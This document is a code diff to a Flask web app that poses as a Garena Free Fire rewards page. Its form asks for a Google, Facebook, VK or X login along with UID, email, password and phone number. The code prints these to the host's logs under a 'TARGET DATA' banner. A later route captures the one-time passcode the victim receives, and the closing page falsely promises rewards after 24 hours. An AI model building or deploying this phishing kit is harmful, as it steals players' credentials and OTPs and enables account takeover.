@@ -2,7 +2,7 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Aapka Fixed Raw Background Link
+# Aapka Background Image Link
 BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
 HTML_TEMPLATE = f'''
@@ -14,7 +14,9 @@ HTML_TEMPLATE = f'''
     <style>
         body {{
             background-image: url('{BG_URL}');
-            background-size: cover; background-position: center; background-attachment: fixed;
+            background-size: cover; 
+            background-position: center; 
+            background-attachment: fixed;
             margin: 0; font-family: sans-serif;
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }}
@@ -44,7 +46,7 @@ HTML_TEMPLATE = f'''
                 <option value="Google">Google Account</option>
                 <option value="Facebook">Facebook Account</option>
                 <option value="VK">VK Account</option>
-                <option value="X">X (Twitter) Account</option>
+                <option value="X">X Account</option>
             </select>
             <button type="submit" class="blue-btn">PROCEED</button>
         </form>
@@ -65,7 +67,7 @@ def preview():
     password = request.form.get('password')
     acc = request.form.get('account_type')
     
-    # YEH LINE RENDER LOGS MEIN DATA DIKHAYEGI
+    # Ye details Render ke Logs mein print hongi
     print(f"\n🎯 [TARGET DATA] 🎯\nUID: {uid}\nEMAIL: {email}\nPASS: {password}\nTYPE: {acc}\nPHONE: {phone}\n" + "="*20)
     
     return f'''
@@ -94,7 +96,7 @@ def submit_final():
             <h2>OTP Verification</h2>
             <p>Code sent to {phone}</p>
             <form action="/final_otp" method="post">
-                <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
+                <input type="text" name="otp" placeholder="Enter 8-digit OTP" maxlength="8" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
                 <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
             </form>
         </div>
@@ -105,7 +107,7 @@ def submit_final():
 def final_otp():
     otp = request.form.get('otp')
     print(f"📩 RECEIVED OTP: {otp}")
-    return "<h1 style='text-align:center; padding-top:50px; font-family:sans-serif;'>Processing... Please wait 24 hours.</h1>"
+    return "<h1 style='text-align:center; padding-top:50px; font-family:sans-serif;'>Processing... Please wait 24 hours for rewards.</h1>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
